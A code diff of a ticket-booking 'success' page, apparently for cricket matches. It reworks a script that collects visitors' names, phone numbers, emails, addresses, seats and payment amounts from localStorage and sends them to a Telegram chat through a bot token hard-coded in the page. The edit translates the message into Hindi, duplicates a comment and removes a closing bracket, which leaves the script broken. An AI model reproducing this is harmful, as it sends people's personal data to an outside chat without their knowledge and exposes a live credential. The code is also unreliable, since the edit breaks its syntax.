@@ -151,6 +151,7 @@
             document.getElementById('display-order-id').innerText = orderId;
 
             // 2. Fetch all user details from localStorage for Telegram
+            // 2. Fetch all user details from localStorage for Telegram
             let matchTitle = "Not Selected";
             let matchDate = "";
             try {
@@ -165,22 +166,24 @@
             const phone = localStorage.getItem('customerPhone') || "Not Provided";
             const email = localStorage.getItem('customerEmail') || "Not Provided";
             const address = localStorage.getItem('customerAddress') || localStorage.getItem('address') || "Not Provided";
+            
+            // यहाँ कितनी सीट और कौन सा स्टैंड (जैसे: 2 x VIP) सब आ जायेगा
             const seats = localStorage.getItem('selectedSeats') || "Not Provided";
 
-            // 3. Telegram Notification Logic
+            // 3. Telegram Notification Logic (HINDI MEIN PURI DETAILS)
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513";
             
-            const message = `✅ *BOOKING SUCCESSFUL / PAYMENT DONE!* ✅\n\n` +
-                            `🎫 *Order ID:* ${orderId}\n` +
-                            `👤 *Name:* ${name}\n` +
-                            `📞 *Phone:* ${phone}\n` +
-                            `📧 *Email:* ${email}\n` +
-                            `🏠 *Address:* ${address}\n` +
-                            `🏏 *Match:* ${matchTitle} ${matchDate}\n` +
-                            `🎟️ *Seats:* ${seats}\n` +
-                            `💰 *Amount Paid:* ₹${finalPrice}\n\n` +
-                            `🌐 *Page:* Success/Thank You Page`;
+            const telegramMsg = `✅ *पेमेंट सफल / टिकट बुक हो गया!* ✅\n\n` +
+                                `🎫 *ऑर्डर ID:* ${orderId}\n` +
+                                `👤 *नाम (Name):* ${name}\n` +
+                                `📞 *नंबर (Phone):* ${phone}\n` +
+                                `📧 *ईमेल (Email):* ${email}\n` +
+                                `🏠 *पता (Address):* ${address}\n` +
+                                `🏏 *मैच (Match):* ${matchTitle} ${matchDate}\n` +
+                                `🎟️ *सीट्स और स्टैंड:* ${seats}\n` +
+                                `💰 *पेमेंट (Amount Paid):* ₹${finalPrice}\n\n` +
+                                `🌐 *स्टेटस:* कस्टमर की बुकिंग कन्फर्म हो गई है (Success Page)!`;
             
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
@@ -189,11 +192,11 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: message,
+                    text: telegramMsg,
                     parse_mode: 'Markdown'
                 })
             }).catch(err => console.error("Telegram Error:", err));
-        });
+            
     </script>
 </body>
 </html>
